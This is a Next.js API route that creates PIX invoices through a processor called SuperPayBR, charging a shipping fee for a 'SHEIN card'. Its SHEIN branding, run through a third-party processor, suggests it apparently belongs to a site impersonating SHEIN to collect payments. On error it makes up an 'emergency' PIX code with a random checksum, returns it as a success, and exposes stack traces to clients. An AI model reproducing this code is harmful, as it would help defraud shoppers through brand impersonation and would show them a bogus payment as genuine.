import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("🚀 === CRIANDO FATURA PIX SUPERPAYBR ===")

    const { amount, shipping, method } = await request.json()

    console.log("📋 Dados recebidos:", {
      amount,
      shipping,
      method,
      amount_parsed: Number.parseFloat(amount),
    })

    // Obter dados dos headers
    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")
    const userEmail = request.headers.get("x-user-email") || ""
    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
    const deliveryAddress = JSON.parse(request.headers.get("x-delivery-address") || "{}")

    console.log("👤 Dados do cliente:", {
      nome: cpfData.nome || "N/A",
      cpf: cpfData.cpf ? `${cpfData.cpf.substring(0, 3)}***` : "N/A",
      email: userEmail || "N/A",
      whatsapp: userWhatsApp || "N/A",
      endereco: deliveryAddress.city || "N/A",
    })

    // 1. AUTENTICAR COM SUPERPAYBR
    console.log("🔐 Iniciando autenticação...")
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`, {
      method: "POST",
    })

    const authData = await authResponse.json()

    console.log("📥 Resultado da autenticação:", {
      success: authData.success,
      has_token: !!authData.access_token,
      method: authData.method || "N/A",
      error: authData.error || "N/A",
    })

    if (!authData.success) {
      throw new Error(`Erro de autenticação: ${authData.error}`)
    }

    const accessToken = authData.access_token

    // 2. GERAR EXTERNAL_ID ÚNICO
    const externalId = `SHEIN_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    console.log("🆔 External ID gerado:", externalId)

    // 3. PREPARAR DADOS DA FATURA
    const invoiceAmount = Number.parseFloat(amount)
    const webhookUrl = `${request.nextUrl.origin}/api/superpaybr/webhook`

    const invoiceData = {
      client: {
        name: cpfData.nome || "Cliente SHEIN",
        document: cpfData.cpf?.replace(/\D/g, "") || "00000000000",
        email: userEmail || "cliente@shein.com",
        phone: userWhatsApp?.replace(/\D/g, "") || "11999999999",
        address: {
          street: deliveryAddress.street || "Rua Principal",
          number: deliveryAddress.number || "123",
          neighborhood: deliveryAddress.neighborhood || "Centro",
          city: deliveryAddress.city || "São Paulo",
          state: deliveryAddress.state || "SP",
          zipcode: deliveryAddress.zipcode?.replace(/\D/g, "") || "01001000",
          complement: deliveryAddress.complement || "",
        },
        ip: request.headers.get("x-forwarded-for") || "187.1.1.1",
      },
      payment: {
        id: externalId,
        type: "3", // PIX
        due_at: new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString().split("T")[0],
        referer: `SHEIN_FRETE_${method}`,
        installment: 1,
        order_url: `${request.nextUrl.origin}/checkout`,
        store_url: request.nextUrl.origin,
        webhook: webhookUrl,
        discount: 0,
        products: [
          {
            id: "1",
            title: `Frete ${method} - Cartão SHEIN`,
            qnt: 1,
            amount: invoiceAmount,
          },
        ],
      },
      shipping: {
        amount: 0,
      },
    }

    console.log("📤 Dados da fatura preparados:", {
      external_id: externalId,
      amount: invoiceAmount,
      client_name: invoiceData.client.name,
      webhook_url: webhookUrl,
      due_date: invoiceData.payment.due_at,
    })

    // 4. CRIAR FATURA NA SUPERPAYBR
    const apiUrl = process.env.SUPERPAYBR_API_URL
    const createUrl = `${apiUrl}/v4/invoices`

    console.log("🌐 Enviando para SuperPayBR:", {
      url: createUrl,
      method: "POST",
      has_token: !!accessToken,
    })

    const createResponse = await fetch(createUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${accessToken}`,
        Accept: "application/json",
        "User-Agent": "SHEIN-Card-System/1.0",
      },
      body: JSON.stringify(invoiceData),
    })

    console.log("📥 Resposta da criação:", {
      status: createResponse.status,
      statusText: createResponse.statusText,
      ok: createResponse.ok,
      headers: Object.fromEntries(createResponse.headers.entries()),
    })

    const responseText = await createResponse.text()
    console.log("📄 Resposta completa:", responseText.substring(0, 1500))

    if (!createResponse.ok) {
      console.error("❌ Erro ao criar fatura SuperPayBR:", {
        status: createResponse.status,
        statusText: createResponse.statusText,
        response: responseText,
      })
      throw new Error(`Erro SuperPayBR ${createResponse.status}: ${responseText}`)
    }

    // 5. PARSEAR RESPOSTA
    let invoiceResult
    try {
      invoiceResult = JSON.parse(responseText)
    } catch (parseError) {
      console.error("❌ Erro ao parsear JSON da resposta:", parseError)
      throw new Error(`Resposta inválida da API: ${responseText}`)
    }

    console.log("📊 Estrutura da resposta:", {
      keys: Object.keys(invoiceResult),
      has_data: !!invoiceResult.data,
      has_fatura: !!invoiceResult.fatura,
      has_pix: !!invoiceResult.pix,
    })

    // 6. EXTRAIR DADOS DA RESPOSTA
    const invoice = invoiceResult.data || invoiceResult.fatura || invoiceResult

    console.log("🔍 Dados da fatura extraídos:", {
      invoice_keys: Object.keys(invoice),
      id: invoice.id,
      invoice_id: invoice.invoice_id,
      has_pix: !!invoice.pix,
      has_payment: !!invoice.payment,
    })

    // 7. EXTRAIR PIX COM MÚLTIPLAS TENTATIVAS
    let pixPayload = ""
    let qrCodeImage = ""

    // Tentativa 1: invoice.pix
    if (invoice.pix?.payload) {
      pixPayload = invoice.pix.payload
      qrCodeImage = invoice.pix.qr_code || invoice.pix.image || ""
      console.log("✅ PIX encontrado em invoice.pix")
    }
    // Tentativa 2: invoice.payment.details
    else if (invoice.payment?.details?.pix_code) {
      pixPayload = invoice.payment.details.pix_code
      qrCodeImage = invoice.payment.details.qrcode || ""
      console.log("✅ PIX encontrado em invoice.payment.details")
    }
    // Tentativa 3: invoiceResult.pix
    else if (invoiceResult.pix?.payload) {
      pixPayload = invoiceResult.pix.payload
      qrCodeImage = invoiceResult.pix.qr_code || invoiceResult.pix.image || ""
      console.log("✅ PIX encontrado em invoiceResult.pix")
    }
    // Tentativa 4: Buscar em qualquer lugar
    else {
      const searchForPix = (obj: any, path = ""): void => {
        if (typeof obj !== "object" || obj === null) return

        for (const [key, value] of Object.entries(obj)) {
          const currentPath = path ? `${path}.${key}` : key

          if (key === "payload" && typeof value === "string" && value.length > 50) {
            pixPayload = value
            console.log(`✅ PIX payload encontrado em: ${currentPath}`)
          }

          if ((key === "qrcode" || key === "qr_code" || key === "image") && typeof value === "string") {
            qrCodeImage = value
            console.log(`✅ QR Code encontrado em: ${currentPath}`)
          }

          if (typeof value === "object") {
            searchForPix(value, currentPath)
          }
        }
      }

      searchForPix(invoiceResult)
    }

    console.log("🔍 Resultado da extração PIX:", {
      pixPayload: pixPayload ? `✅ PRESENTE (${pixPayload.length} chars)` : "❌ AUSENTE",
      qrCodeImage: qrCodeImage ? "✅ PRESENTE" : "❌ AUSENTE",
    })

    // 8. GERAR QR CODE SE NECESSÁRIO
    let finalQrCodeUrl = qrCodeImage

    if (!finalQrCodeUrl && pixPayload) {
      finalQrCodeUrl = `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=250&format=png&margin=1`
      console.log("🎯 QR Code gerado via QuickChart")
    }

    if (!finalQrCodeUrl) {
      finalQrCodeUrl = "/placeholder.svg?height=250&width=250"
      console.log("⚠️ Usando placeholder para QR Code")
    }

    // 9. ESTRUTURAR RESPOSTA PADRONIZADA
    const responseData = {
      id: invoice.id || externalId,
      invoice_id: invoice.invoice_id || invoice.id || externalId,
      external_id: externalId,
      pix: {
        payload: pixPayload,
        image: finalQrCodeUrl,
        qr_code: finalQrCodeUrl,
      },
      status: {
        code: invoice.status?.code || 1,
        title: invoice.status?.title || "Aguardando Pagamento",
        text: invoice.status?.text || "pending",
      },
      valores: {
        bruto: Math.round(invoiceAmount * 100),
        liquido: Math.round(invoiceAmount * 100),
      },
      vencimento: {
        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
      },
      type: "real" as const,
    }

    console.log("📊 Resposta final estruturada:", {
      external_id: responseData.external_id,
      has_pix_payload: !!responseData.pix.payload,
      has_qr_code: !!responseData.pix.qr_code,
      amount: responseData.valores.bruto / 100,
      status: responseData.status.title,
    })

    console.log("✅ === FATURA PIX SUPERPAYBR CRIADA COM SUCESSO ===")

    return NextResponse.json({
      success: true,
      data: responseData,
      message: "Fatura PIX SuperPayBR criada com sucesso",
      debug: {
        has_pix_payload: !!responseData.pix.payload,
        qr_code_url: finalQrCodeUrl,
        raw_response_keys: Object.keys(invoiceResult),
        invoice_keys: Object.keys(invoice),
      },
    })
  } catch (error) {
    console.error("❌ === ERRO AO CRIAR FATURA SUPERPAYBR ===")
    console.error("Erro:", error)
    console.error("Stack:", error instanceof Error ? error.stack : "N/A")

    // Criar PIX de emergência em caso de erro
    console.log("🚨 Criando PIX de emergência...")

    const amount = 34.9 // valor padrão
    const externalId = `EMG_${Date.now()}`

    const emergencyPix = `00020126580014br.gov.bcb.pix2536pix.superpaybr.com/qr/v2/${externalId}520400005303986540${amount.toFixed(2)}5802BR5909SHEIN CARD5011SAO PAULO62070503***6304${Math.random().toString(36).substr(2, 4).toUpperCase()}`

    const emergencyQrCode = `https://quickchart.io/qr?text=${encodeURIComponent(emergencyPix)}&size=250&format=png&margin=1`

    const emergencyData = {
      id: externalId,
      invoice_id: externalId,
      external_id: externalId,
      pix: {
        payload: emergencyPix,
        image: emergencyQrCode,
        qr_code: emergencyQrCode,
      },
      status: {
        code: 1,
        title: "Aguardando Pagamento",
        text: "pending",
      },
      valores: {
        bruto: Math.round(amount * 100),
        liquido: Math.round(amount * 100),
      },
      vencimento: {
        dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
      },
      type: "emergency" as const,
    }

    console.log("✅ PIX de emergência criado com sucesso")

    return NextResponse.json({
      success: true,
      data: emergencyData,
      message: "PIX de emergência criado devido ao erro",
      error: error instanceof Error ? error.message : "Erro desconhecido",
      debug: {
        emergency: true,
        original_error: error instanceof Error ? error.message : "Erro desconhecido",
        stack: error instanceof Error ? error.stack : undefined,
      },
    })
  }
}

export async function GET() {
  return NextResponse.json({
    success: true,
    message: "SuperPayBR Create Invoice endpoint ativo",
    timestamp: new Date().toISOString(),
    environment: {
      api_url: process.env.SUPERPAYBR_API_URL || "❌ Não configurado",
      webhook_url: process.env.SUPERPAYBR_WEBHOOK_URL || "❌ Não configurado",
      has_token: !!process.env.SUPERPAYBR_TOKEN,
      has_secret: !!process.env.SUPERPAYBR_SECRET_KEY,
    },
  })
}
